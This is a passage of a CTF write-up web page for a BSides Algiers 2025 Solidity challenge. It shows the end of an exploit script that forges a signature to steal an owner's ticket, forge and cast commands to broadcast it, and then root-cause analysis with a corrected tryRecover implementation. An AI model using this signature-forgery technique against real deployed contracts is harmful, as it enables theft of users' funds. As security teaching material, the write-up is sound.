+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">vs</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>  <span class="c1">// Invalid v
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">rs</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="kt">bytes32</span><span class="p">(</span><span class="kt">uint256</span><span class="p">(</span><span class="mi">1</span><span class="p">));</span>  <span class="c1">// Arbitrary r
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">ss</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="kt">bytes32</span><span class="p">(</span><span class="kt">uint256</span><span class="p">(</span><span class="kt">uint160</span><span class="p">(</span><span class="n">owner</span><span class="p">)));</span>  <span class="c1">// Owner address as s!
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        
+</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="n">guardian</span><span class="p">.</span><span class="n">batchTransaction</span><span class="p">(</span><span class="n">orders</span><span class="p">,</span> <span class="n">rs</span><span class="p">,</span> <span class="n">ss</span><span class="p">,</span> <span class="n">vs</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;✓ Successfully stole owner&#39;s ticket!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">catch</span> <span class="n">Error</span><span class="p">(</span><span class="kt">string</span> <span class="k">memory</span> <span class="n">reason</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;✗ Ticket theft failed:&#34;</span><span class="p">,</span> <span class="n">reason</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">revert</span><span class="p">(</span><span class="s">&#34;Ticket theft failed&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h2 id="deployment-and-execution">Deployment and Execution</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Set environment variables</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">SETUP_ADDRESS</span><span class="o">=</span>&lt;deployed_setup_address&gt;
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">PLAYER_PRIVATE_KEY</span><span class="o">=</span>&lt;your_private_key&gt;
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">RPC_URL</span><span class="o">=</span>&lt;rpc_endpoint&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Run the exploit</span>
+</span></span><span class="line"><span class="cl">forge script Solve --rpc-url <span class="nv">$RPC_URL</span> --broadcast -vvvv
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Verify solution</span>
+</span></span><span class="line"><span class="cl">cast call <span class="nv">$SETUP_ADDRESS</span> <span class="s2">&#34;isSolved()&#34;</span> --rpc-url <span class="nv">$RPC_URL</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Returns: true (0x0000...0001)</span>
+</span></span></code></pre></div><h2 id="why-each-step-is-necessary">Why Each Step is Necessary</h2>
+<h3 id="step-1-unlocking-is-required">Step 1: Unlocking is Required</h3>
+<p>Without unlocking the Guardian, all calls to <code>batchTransaction</code> will revert with &ldquo;Party not started&rdquo;. This is enforced by the <code>onlyUnlocked</code> modifier.</p>
+<h3 id="step-2-multiple-tickets-required">Step 2: Multiple Tickets Required</h3>
+<p>The win condition explicitly checks <code>party.balances(player) &gt; 1</code>. A single ticket stolen from the owner would only give us 1 ticket total, failing this check.</p>
+<h3 id="step-3-zero-locked-eth-required">Step 3: Zero Locked ETH Required</h3>
+<p>The ghost minter attack serves dual purpose:</p>
+<ul>
+<li>Accumulates tickets for the player</li>
+<li>Returns the ETH via withdraw, ensuring <code>lockedETH == 0</code></li>
+</ul>
+<h2 id="security-analysis-and-mitigation">Security Analysis and Mitigation</h2>
+<h3 id="the-root-cause">The Root Cause</h3>
+<p>The vulnerability stems from three compounding issues:</p>
+<ol>
+<li><strong>Unchecked Return Values</strong>: The <code>pop(staticcall(...))</code> pattern discards the success/failure status</li>
+<li><strong>Memory Manipulation</strong>: The XOR-based offset calculation assumes memory state</li>
+<li><strong>Lack of Input Validation</strong>: No checks on <code>v</code> parameter validity</li>
+</ol>
+<h3 id="proper-implementation">Proper Implementation</h3>
+<p>Here&rsquo;s how <code>tryRecover</code> should be implemented:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">tryRecover</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">bytes32</span> <span class="n">hash</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint8</span> <span class="n">v</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">bytes32</span> <span class="n">r</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">bytes32</span> <span class="n">s</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span> <span class="k">internal</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span> <span class="n">result</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Validate v parameter
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="n">v</span> <span class="o">!=</span> <span class="mi">27</span> <span class="o">&amp;&amp;</span> <span class="n">v</span> <span class="o">!=</span> <span class="mi">28</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kt">address</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">assembly</span> {
+</span></span><span class="line"><span class="cl">        <span class="ow">let</span> <span class="nv">m</span> <span class="o">:=</span> <span class="nf">mload</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="nf">mstore</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="n">hash</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">mstore</span><span class="p">(</span><span class="nf">add</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">),</span> <span class="n">v</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">mstore</span><span class="p">(</span><span class="nf">add</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">),</span> <span class="n">r</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">mstore</span><span class="p">(</span><span class="nf">add</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">),</span> <span class="n">s</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1">// Check the return value!
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="ow">let</span> <span class="nv">success</span> <span class="o">:=</span> <span class="nf">staticcall</span><span class="p">(</span><span class="nf">gas</span><span class="p">(),</span> <span class="mi">1</span><span class="p">,</span> <span class="n">m</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="nf">add</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">),</span> <span class="mh">0x20</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">if</span> <span class="n">success</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">result</span> <span class="o">:=</span> <span class="nf">mload</span><span class="p">(</span><span class="nf">add</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// If not success, result remains address(0)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h3 id="alternative-use-openzeppelin">Alternative: Use OpenZeppelin</h3>
+<p>OpenZeppelin&rsquo;s ECDSA library handles all edge cases correctly:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;@openzeppelin/contracts/utils/cryptography/ECDSA.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">verify</span><span class="p">(</span><span class="kt">bytes32</span> <span class="n">hash</span><span class="p">,</span> <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">signature</span><span class="p">)</span> <span class="k">internal</span> <span class="k">pure</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ECDSA</span><span class="p">.</span><span class="n">recover</span><span class="p">(</span><span class="n">hash</span><span class="p">,</span> <span class="n">signature</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h2 id="key-takeaways">Key Takeaways</h2>
+<ol>
+<li><strong>Always check return values</strong> from low-level calls, especially in assembly</li>
+<li><strong>Never trust memory state</strong> - the EVM doesn&rsquo;t clear memory automatically</li>
+<li><strong>Validate inputs</strong> before passing to precompiles (e.g., check v ∈ {27, 28})</li>
+<li><strong>Use battle-tested libraries</strong> like OpenZeppelin instead of custom crypto implementations</li>
+<li><strong>Assembly is dangerous</strong> - only use when absolutely necessary and audit thoroughly</li>
+<li><strong>Multiple vulnerabilities compound</strong> - this challenge required chaining three separate exploits</li>
+</ol>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://swcregistry.io/docs/SWC-104" target="_blank" rel="noopener noreffer">SWC-104: Unchecked Call Return Values</a></li>
+<li><a href="https://ethereum.github.io/yellowpaper/paper.pdf" target="_blank" rel="noopener noreffer">Ethereum Yellow Paper - Precompiled Contracts</a></li>
+<li><a href="https://eips.ethereum.org/EIPS/eip-1" target="_blank" rel="noopener noreffer">EIP-1: ecrecover Precompile</a></li>
+<li><a href="https://docs.soliditylang.org/en/latest/assembly.html" target="_blank" rel="noopener noreffer">Solidity Assembly Documentation</a></li>
+<li><a href="https://docs.openzeppelin.com/contracts/4.x/api/utils#ECDSA" target="_blank" rel="noopener noreffer">OpenZeppelin ECDSA Library</a></li>
+<li><a href="https://github.com/crytic/building-secure-contracts" target="_blank" rel="noopener noreffer">Trail of Bits: Building Secure Contracts</a></li>
+</ul>
+<hr>
+<p><strong>Challenge Author</strong>: 0xbrivan<br>
+<strong>CTF</strong>: BSides Algiers 2025<br>
+<strong>Category</strong>: Blockchain<br>
+<strong>Writeup by</strong>: Koyphshi</p></div><div class="post-footer" id="post-footer">
+    <div class="post-info"><div class="post-info-tag"><span><a href="/tags/blockchain/">Blockchain</a>
+                </span><span><a href="/tags/solidity/">Solidity</a>
+                </span><span><a href="/tags/assembly/">Assembly</a>
+                </span><span><a href="/tags/ecrecover/">Ecrecover</a>
+                </span><span><a href="/tags/evm/">Evm</a>
+                </span></div><div class="post-info-line"><div class="post-info-mod">
+                <span>Updated on 2025-12-24</span>
+            </div><div class="post-info-mod"></div>
+        </div></div><div class="post-nav"><a href="/posts/bsides/geni/" class="prev" rel="prev" title="Geni"><i class="fa-solid fa-angle-left fa-fw"></i>Previous Post</a></div></div>
+</div></article></div>
+            </main>
+            <footer class="footer"><div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.152.2 (6abdacad3f3fe944ea42177844469139e81feda6)">Hugo</a> | Theme - <a href="https://github.com/khusika/FeelIt" target="_blank" rel="noopener noreffer" title="FeelIt 1.0.3"><i class="fa-solid fa-hand-holding-heart fa-fw"></i> FeelIt</a>
+        </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw"></i><span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/"></a></span></div>
+</div>
+</footer>
+        </div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fa-solid fa-chevron-up fa-fw"></i>
+            </a></div><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/katex/katex.min.js"></script><script src="/lib/katex/auto-render.min.js"></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script src="/js/theme.min.js"></script></body></html>
